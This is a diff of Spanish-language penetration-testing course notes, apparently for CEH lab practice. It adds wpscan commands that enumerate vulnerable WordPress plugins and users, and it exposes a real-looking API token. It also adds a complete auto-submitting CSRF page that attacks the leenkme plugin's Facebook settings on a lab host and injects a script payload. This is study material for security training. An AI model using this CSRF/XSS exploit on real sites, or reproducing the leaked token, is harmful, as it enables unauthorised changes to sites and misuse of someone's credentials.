@@ -237,12 +237,39 @@
   
   Laboratorio CSRF
   ----------------
-  API WPSCAN: 4o1u4sDYaoULM5VuRPSmth7WvtJ8NeDqGnZ6frqKrRg
-  Escaneo wpscan
-  --------------
-  wpscan --api-token 4o1u4sDYaoULM5VuRPSmth7WvtJ8NeDqGnZ6frqKrRg --url http://192.168.10.16:8080/CEH --plugins-detection aggressive --enumerate vp
-  
-  
+  Uso de WPSCAN para obtener información de un sitio que utiliza wordpress.
+  -------------------------------------------------------------------------
+  Para el uso de WPSCAN es necesario indicar el API de la cuenta: API WPSCAN: 4o1u4sDYaoULM5VuRPSmth7WvtJ8NeDqGnZ6frqKrRg
+    Escaneo wpscan para detectar plugins y enumerar los plugins que sean vulnerables
+    --------------------------------------------------------------------------------
+    wpscan --api-token 4o1u4sDYaoULM5VuRPSmth7WvtJ8NeDqGnZ6frqKrRg --url [url] --plugins-detection aggressive --enumerate vp
+
+    Escaneo wpscan para enumerar los usuarios
+    -----------------------------------------
+    wpscan --api-token 4o1u4sDYaoULM5VuRPSmth7WvtJ8NeDqGnZ6frqKrRg --url [url] --enumerate u
+    
+    
+  Laboratorio CSRF
+  ----------------
+  <html> 
+	<body onload="document.forms['CSRF'].submit()" > 
+		<form name="CSRF" action="http://192.168.10.16:8080/CEH/wp-admin/admin.php?page=leenkme_facebook" method="POST"> 
+			<input type="hidden" name="facebook_profile" value="on" /> 
+			<input type="hidden" name="fb_publish_wpnonce" value="" /> 
+			<input type="hidden" name="_wp_http_referer" value="CSRF" /> 
+			<input type="hidden" name="facebook_message" value="Hacked!!!" /> 
+			<input type="hidden" name="facebook_linkname" value="CSRF" /> 
+			<input type="hidden" name="facebook_caption" value="CSRF" /> 
+			<input type="hidden" name="facebook_description" value="</textarea>;<script>prompt();</script>" /> 
+			<input type="hidden" name="default_image" value="CSRF" /> 
+			<input type="hidden" name="message_preference" value="author" /> 
+			<input type="hidden" name="clude" value="in" /> 
+			<input type="hidden" name="publish_cats[];" value="0" /> 
+			<input type="hidden" name="update_facebook_settings" value="Save Settings" /> 
+			<input type="submit" value="Submit form" />
+		</form> 
+	</body>
+</html> 
   
   
   
